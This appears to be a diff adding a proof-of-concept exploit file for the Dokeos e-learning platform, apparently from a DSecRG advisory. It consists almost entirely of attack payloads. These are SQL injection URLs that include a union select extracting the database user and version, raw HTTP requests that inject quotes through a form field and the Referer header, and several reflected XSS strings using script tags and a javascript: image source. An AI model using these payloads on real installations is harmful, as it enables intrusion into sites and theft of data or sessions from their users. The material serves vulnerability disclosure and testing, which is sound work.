@@ -1,0 +1,31 @@
+
+http://www.example.com/[installdir]/whoisonline.php?id=1'+and+"dsec"="dsecrg"+union+select+user(),version()/*
+http://www.example.com/[installdir]/main/mySpace/index.php?tracking_list_coaches_direction=ASC&tracking_list_coaches_page_nr=1&tracking_list_coaches_per_page=20&view=admin&tracking_list_coaches_column=0';
+
+POST /dokeos/main/create_course/add_course.php HTTP/1.0
+Cookie: dk_sid=av68g9lus300ts870iqebhneh5
+Content-Length: 107
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost/dokeos/main/create_course/add_course.php
+title=1234&category_code=PROJ&wanted_code=1234&course_language=slovenian&_qf__add_course=&tutor_name='
+
+GET /dokeos/index.php HTTP/1.0
+Cookie: dk_sid=av68g9lus300ts870iqebhneh5
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+Host: localhost
+Referer: '
+
+http://www.example.com/[installdir]/main/calendar/myagenda.php?courseCode="><script>alert('DSecRG 
+XSS')</script>
+
+http://www.example.com/[installdir]/dokeos/main/admin/course_category.php?category=<script>alert('DSecRG 
+XSS')</script> HTTP/1.0
+http://www.example.com/[installdir]/dokeos/main/admin/session_list.php?action=show_message&message=>%22%27><img/src=javascript:alert('DSecRGXSS')>
+
+
